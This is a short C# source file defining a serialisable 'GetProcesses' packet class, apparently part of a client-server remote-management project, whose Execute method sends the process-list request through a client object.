﻿using Client.Controllers;
using ZeroFormatter;

namespace Client.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetProcesses : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetProcesses;
            }
        }

        public GetProcesses()
        {
        }

        public void Execute(ClientMosaique client)
        {
            client.send(this);
        }
    }
}
